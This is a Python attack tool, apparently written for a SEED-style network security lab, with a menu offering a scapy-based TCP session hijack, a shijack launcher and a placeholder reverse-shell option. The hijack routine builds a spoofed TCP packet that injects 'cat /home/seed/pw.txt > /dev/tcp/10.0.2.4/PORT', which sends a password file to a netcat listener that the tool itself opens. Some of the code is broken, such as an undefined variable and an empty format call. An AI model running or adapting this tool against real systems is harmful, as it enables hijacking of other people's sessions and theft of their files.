#!/usr/bin/python3
import sys
import socket
from scapy.all import *
import time

# for i in range(10):
#     sys.stdout.write("\r{0}>".format("="*i))
#     sys.stdout.flush()
#     time.sleep(0.5)

class TCP_HiJack_Attack:
    def __init__(self,logName):
        self.logName = logName
        self.ws = True
        self.ipSrc = ["Source_IP","10.0.2.15"]
        self.ipDst = ["Destination_IP","10.0.2.5"]
        self.senderPort = ["Sender_port","42800"]
        self.destPort = ["Destination_Port","22"]
        self.flags = ["Flags",'A']
        self.seqPkt = ["Seq_Packet_Number","4009307614"]
        self.ackPkt = ["Ack_Packet_Number","2592002052"]
        self.attackInputs = [self.ipSrc,self.ipDst,self.senderPort,self.destPort,self.flags,self.seqPkt,self.ackPkt]
        self.interfaceOption = 0

    def getHostInfo(self):
        global hostName,hostIp,listeningInterface,ws
        try:
            hostName = socket.gethostname()
            hostIp = socket.gethostbyname(hostName)
            print("Available interfaces\n------------------------------")
            print(socket.if_nameindex())
            print("------------------------------\n" + "Select interface\n")
            while True:
                try:
                    interfaceOption = input("Choose 1 - {} or [C] to continue without initializing Wireshark\n".format(len(socket.if_nameindex())))
                    if str(interfaceOption.lower()) in ["C","c"]:
                        self.ws = False
                        break
                    elif int(interfaceOption) -1 not in range(0,int(len(socket.if_nameindex()))):
                        print("{} is not a valid choice".format(interfaceOption))
                    else:
                        listeningInterface = int(interfaceOption)
                        break
                except Exception as error:
                    print("{} is not a valid choice".format(interfaceOption))
        except:
            print("Unable to decipher interface")
        else:
            if self.ws == False:
                print("Packet Data captured externally by user")
            else:
                print("Packet Data capture interface set at: {} ".format(socket.if_nameindex()[listeningInterface - 1]))

    def beginWireshark(self):
        try:
            subprocess.Popen('wireshark -i {} -k'.format(listeningInterface - 1),shell=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        except:
            print("Error initializing Wireshark")
        else:
            print("Wireshark initialized on {}".format(socket.if_nameindex()[listeningInterface-1]))

    def beginNetcat(self):
        global netcatPortOption,ncScript
        while True:
            try:
                netcatPortOption = int(input("Enter capture port \n"))
                if netcatPortOption not in range(1,65535):
                    print("Invalid choice entered -> Valid ports are 1 - 65535")
                else:
                    break
            except Exception as error:
                print(error)
        netcatFileOption = str(input("Enter capture log file name\n "))
        try:
            subprocess.Popen(['xterm', '-e', 'nc -lvv {} > {}'.format(netcatPortOption, netcatFileOption)])
        except:
            print("Error initializing Netcat")
        else:
            print("Netcat initialized on Port: {} Capture File: {}".format(netcatPortOption, netcatFileOption))

    def gatherPktData(self):
        try:
            for currentInput in self.attackInputs:
                if len(currentInput) < 2:
                    print(i[0])
                else:
                    print("###################################")
                    print("{}".format(currentInput[0]))
                    print("Selection set at : {}".format(currentInput[1]))
                    while True:
                        try:
                            selectionOption = input("Save[s] or Edit[e] ? ")
                            print(selectionOption.lower())
                            if selectionOption.lower() not in ["s","e","save","edit"]:
                                    print("Invalid choice entered [{}]".format(selectionOption))
                            elif selectionOption.lower() in ["e","edit"]:
                                newSelectionEntry = input("New entry: ")
                                currentInput[1] = newSelectionEntry
                                print("Entry Updated")
                                print("-------------------------")
                                print(currentInput[0] + " -> " + currentInput[1])
                                break
                            elif selectionOption.lower() == "s" or selectionOption.lower() == "save":
                                    break
                        except Exception as error:
                            print(error)
        except:
            print("Error processing Attack data")
        else:
            print("Attack Parameters stored as:")
            for attack in self.attackInputs:
                print(attack)

    def setAttackVector(self):
        global attackVector,netcatPortOption
        attackVector = '\r cat /home/seed/pw.txt > /dev/tcp/10.0.2.4/{}\r'.format(netcatPortOption)
        try:
            print("###################################")
            print("Attack String set at {}".format(attackVector))
            while True:
                try:
                    selectionOption = input("Save[s] or Edit[e] ? ")
                    print(selectionOption.lower())
                    if selectionOption.lower() not in ["s","e","save","edit"]:
                            print("Invalid choice entered [{}]".format(selectionOption))
                    elif selectionOption.lower() in ["e","edit"]:
                        newAttackVector = input("New entry: ")
                        attackVector = newAttackVector
                        print("Entry Updated")
                        print("-------------------------")
                        print("New Attack String: " + attackVector)
                        break
                    elif selectionOption.lower() == "s" or selectionOption.lower() == "save":
                            break
                except Exception as error:
                    print(error)
        except:
            print("Error processing Attack data")
        else:
            print("Attack String stored as: {}".format(attackVector))

    def buildPacket(self):
        global attackInputs,attackPacket
        IPLayer =IP(src=self.attackInputs[0][1],dst=self.attackInputs[1][1])
        TCPLayer =TCP(sport=int(self.attackInputs[2][1]),dport=int(self.attackInputs[3][1]),flags=str(self.attackInputs[4][1]),seq=int(self.attackInputs[5][1]),ack=int(self.attackInputs[6][1]))
        attackPacket = IPLayer/TCPLayer/attackVector

    def deliverPayload(self):
        ls(attackPacket)
        send(attackPacket,verbose=0)

    def initializeAttack(self):
        self.getHostInfo()

        if self.ws == True:
            input("Press Enter to initialize Wireshark...")
            self.beginWireshark()

        input("Press Enter to input Attack Info...")
        self.gatherPktData()

        # input("Press enter to initialize NetCat")
        self.beginNetcat()

        self.setAttackVector()
        self.buildPacket()

        input("Press Enter to deliver payload...")
        self.deliverPayload()

class ShiJack:
    def __init__(self,logName):
        self.logName = logName
        self.client = ["Client IP: ","10.0.2.15"]
        self.clientPort = ["Client Port: ","49834"]
        self.server = ["Server IP: ","10.0.2.5"]
        self.serverPort = ["Server Port: ","23"]
        self.attackInputs = [self.client,self.clientPort,self.server,self.serverPort]

    def gatherAttackData(self):
        try:
            self.beginWireshark()
            for currentInput in self.attackInputs:
                if len(currentInput) < 2:
                    print(currentInput[0])
                else:
                    print("###################################")
                    print("{}".format(currentInput[0]))
                    print("Selection set at : {}".format(currentInput[1]))
                    while True:
                        try:
                            selectionOption = input("Save[s] or Edit[e] ? ")
                            print(selectionOption.lower())
                            if selectionOption.lower() not in ["s","e","save","edit"]:
                                    print("Invalid choice entered [{}]".format(selectionOption))
                            elif selectionOption.lower() in ["e","edit"]:
                                newSelectionEntry = input("New entry: ")
                                currentInput[1] = newSelectionEntry
                                print("Entry Updated")
                                print("-------------------------")
                                print(currentInput[0] + " -> " + currentInput[1])
                                break
                            elif selectionOption.lower() == "s" or selectionOption.lower() == "save":
                                    break
                        except Exception as error:
                            print(error)
        except Exception as error:
            print("Error processing Attack data: \n{}".format(error))
        else:
            print("Attack Parameters stored as:")
            for attack in self.attackInputs:
                print(attack)

    def startAttack(self):
        try:
            subprocess.Popen(['xterm', '-e', 'sudo ./shijack-lnx {} {} {} {} {}'.format( socket.if_nameindex()[1][1],self.attackInputs[0][1],self.attackInputs[1][1],self.attackInputs[2][1],self.attackInputs[3][1])])
        except Exception as error:
            print("Error starting Shijack: \n{}".format(error))
        else:
            self.beginNetcat()
            print("Shijack initialized")

    def beginWireshark(self):
        try:
            subprocess.Popen('wireshark -i {} -k'.format(),shell=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        except:
            print("Error initializing Wireshark")
        else:
            print("Wireshark initialized on {}".format(socket.if_nameindex()[1][1]))

    def beginNetcat(self):
        while True:
            try:
                netcatPortOption = int(input("Enter capture port \n"))
                if netcatPortOption not in range(1,65535):
                    print("Invalid choice entered -> Valid ports are 1 - 65535")
                else:
                    break
            except Exception as error:
                print(error)
        netcatFileOption = str(input("Enter capture log file name\n "))
        try:
            subprocess.Popen(['xterm', '-e', 'nc -lvv {} > {}'.format(netcatPortOption, netcatFileOption)])
        except:
            print("Error initializing Netcat")
        else:
            print("Netcat initialized on Port: {} Capture File: {}".format(netcatPortOption, netcatFileOption))


    def initializeAttack(self):
        self.gatherAttackData()
        self.startAttack()

class ReverseShell:
    def __init__(self,logName):
        self.logName = logName

    def initializeAttack(self):
        print("ATTACK!")


def main():
    attacks = [["TCP HiJack",1],["ShiJack",2],["Reverse Shell",3]]
    choice ='0'
    while choice =='0':
        print("Main Attack Menu:\nChoose 1 of {} attacks\n".format(len(attacks)))
        for attack in attacks:
            print("Choose {} for {}".format(attack[1],attack[0]))
        print("Choose H to see Help Menu")

        choice = input ("Please make a choice: ")

        if choice.lower() == "h":
            print("Go to Help menu")
            second_menu()
        elif choice == "3":
            print("Reverse Shell Attack chosen")
            input("Press enter to continue")
            logName = input("Enter capture log filename: ")
            attackChoice = ReverseShell(logName)
            attackChoice.initializeAttack()
            choice ='0'
        elif choice == "2":
            print("ShiJack Attack chosen")
            input("Press enter to continue")
            logName = input("Enter capture log filename: ")
            attackChoice = ShiJack(logName)
            attackChoice.initializeAttack()
            choice ='0'
        elif choice == "1":
            print("TCP HiJack Attack chosen")
            input("Press enter to continue")
            logName = input("Enter capture log filename: ")
            attackChoice = TCP_HiJack_Attack(logName)
            attackChoice.initializeAttack()
            choice ='0'
        else:
            print("I don't understand your choice.")

def second_menu():
    print("This is the Help menu")

main()
